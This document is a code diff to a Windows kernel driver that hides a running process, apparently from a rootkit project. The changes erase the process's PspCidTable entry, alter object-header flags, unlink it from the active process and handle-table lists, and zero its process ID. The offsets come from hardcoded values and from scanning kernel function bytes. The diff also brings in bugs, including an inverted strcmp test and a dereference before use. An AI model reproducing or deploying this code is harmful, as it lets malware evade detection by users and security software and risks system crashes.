@@ -1,7 +1,7 @@
 #include "HideProcess.h"
 #include "structs.h"
 
-NTKERNELAPI PUCHAR PsGetProcessImageFileName(__in PEPROCESS Process);
+EXTERN_C NTKERNELAPI PCHAR PsGetProcessImageFileName(__in PEPROCESS Process);
 
 ULONG GetActiveProcessLinksOffset();
 PEPROCESS ForceFindProcessByName(PCHAR szName);
@@ -11,30 +11,21 @@ HANDLE FindProcessIdByName(PCHAR szName);
 PEPROCESS ForceFindProcessByName(PCHAR szName)
 {
     NTSTATUS status = STATUS_SUCCESS;
-    PEPROCESS pEprocess = NULL;
-    PUCHAR ProcessPathName = NULL;
+    PEPROCESS Process = NULL;
+    PCHAR ProcessPathName = NULL;
 
-    for (size_t i = 4; i < 0x10000000; i += 4)
+    for (ULONG64 i = 4; i < 0x10000000; i += 4)
     {
-        status = PsLookupProcessByProcessId((HANDLE)i, &pEprocess);
+        status = PsLookupProcessByProcessId((HANDLE)i, &Process);
         if (!NT_SUCCESS(status))
-        {
             continue;
-        }
-
-        ProcessPathName = PsGetProcessImageFileName(pEprocess);
+        ObfDereferenceObject(Process);
+        ProcessPathName = PsGetProcessImageFileName(Process);
         if (!ProcessPathName)
-        {
             continue;
-        }
-
         DbgPrint("%s \r\n", ProcessPathName);
-
         if (strstr(ProcessPathName, szName) != 0)
-        {
-            return pEprocess;
-        }
-        ObfDereferenceObject(pEprocess);
+            return Process;
     }
     return NULL;
 }
@@ -44,12 +35,11 @@ HANDLE FindProcessIdByName(PCHAR szName)
 {
     NTSTATUS status = STATUS_SUCCESS;
     PEPROCESS Process = NULL;
-    PUCHAR ProcessName = NULL;
+    PCHAR ProcessName = NULL;
     PLIST_ENTRY pHead = NULL;
     PLIST_ENTRY pNode = NULL;
 
     ULONG64 ActiveProcessLinksOffset = GetActiveProcessLinksOffset();
-    //KdPrint(("ActiveProcessLinksOffset = %llX\n", ActiveProcessLinksOffset));
     if (!ActiveProcessLinksOffset)
     {
         KdPrint(("GetActiveProcessLinksOffset failed\n"));
@@ -64,12 +54,10 @@ HANDLE FindProcessIdByName(PCHAR szName)
     {
         Process = (PEPROCESS)((ULONG64)pNode - ActiveProcessLinksOffset);
         ProcessName = PsGetProcessImageFileName(Process);
-        //KdPrint(("%s\n", ProcessName));
-        if (strstr(szName, ProcessName))
+        if (strcmp(szName, ProcessName))
         {
             return *(HANDLE*)((ULONG64)pNode - 8);
         }
-
         pNode = pNode->Flink;
     } while (pNode != pHead);
 
@@ -93,15 +81,9 @@ ULONG GetActiveProcessLinksOffset()
 
     PUCHAR pfnPsGetProcessId = (PUCHAR)MmGetSystemRoutineAddress(&FunName);
     if (pfnPsGetProcessId && MmIsAddressValid(pfnPsGetProcessId) && MmIsAddressValid(pfnPsGetProcessId + 0x7))
-    {
         for (size_t i = 0; i < 0x7; i++)
-        {
             if (pfnPsGetProcessId[i] == 0x48 && pfnPsGetProcessId[i + 1] == 0x8B)
-            {
                 return *(PULONG)(pfnPsGetProcessId + i + 3) + 8;
-            }
-        }
-    }
     return 0;
 }
 
@@ -126,15 +108,9 @@ ULONG GetProtectionOffset()
 
     PUCHAR pfnPsIsProtectedProcess = (PUCHAR)MmGetSystemRoutineAddress(&FunName);
     if (pfnPsIsProtectedProcess && MmIsAddressValid(pfnPsIsProtectedProcess) && MmIsAddressValid(pfnPsIsProtectedProcess + 0x10))
-    {
         for (size_t i = 0; i < 0x10; i++)
-        {
             if (pfnPsIsProtectedProcess[i] == 0xF6 && pfnPsIsProtectedProcess[i + 1] == 0x81 && pfnPsIsProtectedProcess[i + 7] == 0xB8)
-            {
                 return *(PULONG)(pfnPsIsProtectedProcess + i + 2);
-            }
-        }
-    }
     return 0;
 }
 
@@ -249,12 +225,27 @@ PVOID __fastcall MyExpLookupHandleTableEntry(PHANDLE_TABLE PspCidTable, HANDLE H
 NTSTATUS HideProcessByProcessId(HANDLE ProcessId)
 {
     NTSTATUS status = STATUS_SUCCESS;
-    BOOLEAN bFlag = FALSE;
     PEPROCESS Process = NULL;
-    typedef PULONG64(NTAPI* pfnExpLookupHandleTableEntry)(PULONG64 PspCidTable, HANDLE pid);
+
+	ULONG ActiveProcessLinksOffset = 0;
+	ULONG HandleTableOffset = 0x570;
+
+	typedef PULONG64(NTAPI* pfnExpLookupHandleTableEntry)(PHANDLE_TABLE PspCidTable, HANDLE pid);
     pfnExpLookupHandleTableEntry ExpLookupHandleTableEntry = NULL;
+    POBJECT_HEADER ObjectHeader = NULL;
+    PHANDLE_TABLE PspCidTable = 0;
+
+    //DbgBreakPoint();
 
     KdPrint(("[*] HideProcessByProcessId(%lld)\n", (ULONG64)ProcessId));
+    status = PsLookupProcessByProcessId(ProcessId, &Process);
+    if (!NT_SUCCESS(status))
+    {
+        KdPrint(("PsLookupProcessByProcessId failed\n"));
+        return status;
+    }
+    KdPrint(("EPROCESS = %p\n", Process));
+    ObjectHeader = (POBJECT_HEADER)((ULONG64)Process - 0x30);
 
     ExpLookupHandleTableEntry = (pfnExpLookupHandleTableEntry)GetExpLookupHandleTableEntryFunc();
     if (!ExpLookupHandleTableEntry)
@@ -263,48 +254,60 @@ NTSTATUS HideProcessByProcessId(HANDLE ProcessId)
         //return STATUS_UNSUCCESSFUL;
         ExpLookupHandleTableEntry = (pfnExpLookupHandleTableEntry)MyExpLookupHandleTableEntry;
     }
-    PULONG64 PspCidTable = GetPspCidTable();
+    PspCidTable = (PHANDLE_TABLE)GetPspCidTable();
     if (!PspCidTable)
     {
         KdPrint(("PspCidTable failed\n"));
         return STATUS_UNSUCCESSFUL;
     }
-    ULONG ActiveProcessLinksOffset = GetActiveProcessLinksOffset();
+    ActiveProcessLinksOffset = GetActiveProcessLinksOffset();
     if (!ActiveProcessLinksOffset)
     {
         KdPrint(("GetActiveListOffset failed\n"));
         return STATUS_UNSUCCESSFUL;
     }
 
-    status = PsLookupProcessByProcessId(ProcessId, &Process);
-    if (!NT_SUCCESS(status))
-    {
-        KdPrint(("PsLookupProcessByProcessId failed\n"));
-        return status;
-    }
-    KdPrint(("EPROCESS = %p\n", Process));
-
-    //DbgBreakPoint();
     PVOID CidTableItem = ExpLookupHandleTableEntry(PspCidTable, ProcessId);
     KdPrint(("CidTableItem = %p\n", CidTableItem));
 
     KeEnterCriticalRegion();
 
     memset(CidTableItem, 0, 0x10);   //Wipe Handle in PspCidTable
-    //SetProtectionStatus(Process);
-    *(UCHAR*)((ULONG64)Process - 0x15) = 0x4;   //ObjectHeader.Flags.KernelOnlyAccess = 1
-    //RemoveEntryList((PLIST_ENTRY)((PUCHAR)Process + ActiveProcessLinksOffset));
-    //InitializeListHead((PLIST_ENTRY)((PUCHAR)Process + ActiveProcessLinksOffset));  //SelfConnected
+    SetProtectionStatus(Process);
+    
+    /*
+    +0x01b Flags            : 0x71 'q'
+	+0x01b NewObject        : 0y1
+	+0x01b KernelObject     : 0y0
+	+0x01b KernelOnlyAccess : 0y0
+	+0x01b ExclusiveObject  : 0y0
+	+0x01b PermanentObject  : 0y1
+	+0x01b DefaultSecurityQuota : 0y1
+	+0x01b SingleHandleEntry : 0y1
+	+0x01b DeletedInline    : 0y0
+    */
+
+    ObjectHeader->NewObject = 1;
+    ObjectHeader->KernelOnlyAccess = 1;
+    ObjectHeader->PermanentObject = 1;
+    ObjectHeader->DefaultSecurityQuota = 1;
+
+    PLIST_ENTRY ActiveProcessLinksAddress = (PLIST_ENTRY)((PUCHAR)Process + ActiveProcessLinksOffset);
+    RemoveEntryList(ActiveProcessLinksAddress);
+    InitializeListHead(ActiveProcessLinksAddress);  //SelfConnected
+
+    PHANDLE_TABLE ObjectTable = *(PHANDLE_TABLE*)((PUCHAR)Process + HandleTableOffset);
+    PLIST_ENTRY HandleTableListAddress = &ObjectTable->HandleTableList;
+	RemoveEntryList(HandleTableListAddress);
+    InitializeListHead(HandleTableListAddress);
 
     //Will trigger BSOD if pid not exist on Win7
-    *(PULONG64)((PUCHAR)Process + ActiveProcessLinksOffset - 8) = 0x0;    //ProcessId 
+    ULONG64 UniqueProcessIdAddress = (ULONG64)Process + ActiveProcessLinksOffset - 8;
+    *(PULONG64)(UniqueProcessIdAddress) = 0x0;    //ProcessId 
 
     KeLeaveCriticalRegion();
 
-    return TRUE;
-
     ObDereferenceObject(Process);
-
     return status;
 }
 
@@ -322,7 +325,6 @@ NTSTATUS HideProcessByName(PCHAR szName)
     }
 
     HideProcessByProcessId(ProcessId);
-
     return status;
 }
 
